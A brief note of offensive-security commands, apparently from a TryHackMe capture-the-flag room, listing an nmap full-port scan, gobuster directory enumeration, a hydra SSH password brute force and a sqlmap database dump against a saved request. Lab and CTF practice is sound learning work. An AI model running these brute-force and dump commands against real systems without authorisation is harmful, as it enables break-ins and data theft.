# Enum
sudo nmap -T4 --min-rate 1000 -sV -sC -p- -oN nmap_report <ip>
❯ gobuster dir -u <http://10.10.34.182:1337/> -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt


# Brute Force
hydra -l <username> -P <password_list> ssh://<target IP>



python3 sqlmap.py -r /home/tryhackme/expose/expose.req — dump
